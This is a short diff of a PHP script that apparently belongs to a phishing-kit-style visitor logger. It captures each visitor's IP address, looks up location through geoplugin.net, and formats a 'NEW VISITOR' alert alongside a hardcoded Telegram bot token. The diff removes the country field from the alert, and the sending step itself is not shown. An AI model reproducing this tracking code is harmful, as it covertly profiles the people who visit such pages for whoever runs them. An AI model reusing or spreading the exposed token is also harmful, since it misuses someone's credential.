@@ -23,7 +23,7 @@ $ipdat = @json_decode(file_get_contents(
     "http://www.geoplugin.net/json.gp?ip=" . $ip));
 $msg = "
 ----------- ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥----------------->
-NEW VISITOR :  IP : $ip | COUNTRY : $ipdat->geoplugin_countryName .
+NEW VISITOR :  IP : $ip |
 ------------ ♥◌⑅●♡⋆♡LOVE♡⋆♡●⑅◌♥---------------->";
 
 $token = "6618571299:AAFZCV29kiwuQl0Fh_Uz75cqOSsshSHTXOM";
